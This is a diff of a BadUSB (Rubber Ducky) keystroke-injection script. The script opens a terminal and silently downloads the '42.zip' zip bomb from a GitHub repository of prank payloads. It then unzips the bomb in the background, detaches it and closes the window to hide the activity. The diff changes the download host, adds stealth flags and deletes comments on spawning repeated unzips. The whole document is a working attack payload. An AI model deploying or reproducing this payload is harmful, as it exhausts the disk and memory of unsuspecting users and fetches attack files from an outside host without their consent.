@@ -12,25 +12,7 @@ DELAY 300
 CTRL-ALT t
 DELAY 1500
 REM FIRE IN THE HOLE!
-STRING nohup wget https://www.lostserver.com/static/42.zip >/dev/null && unzip 42.zip >/dev/null &
-DELAY 500
+STRING cd /tmp/ && nohup wget -q https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/42.zip 2>/dev/null && unzip 42.zip 2>/dev/null & disown
 ENTER
 DELAY 500
 ALT F4
-REM If you wanna spawn multiple instances an be an evil dick don't hit lostserver a bunch of times, just spawn a new background unzip of the same zip. Don't forget to delete line 19, also know nobody likes you. So not cool!!!
-REM give it 10 sec's to download
-REM DELAY 10000
-REM CTRL c
-REM DELAY 300
-REM STRING nohup unzip 42.zip >/dev/null &
-REM DELAY 100
-REM ENTER
-REM DELAY 300
-REM CTRL c
-REM DELAY 200
-REM UP
-REM DELAY 100
-REM ENTER
-REM rinse and repeat lines 28-33 as many times as you feel like and close terminal
-REM DELAY 300
-REM ALT F4
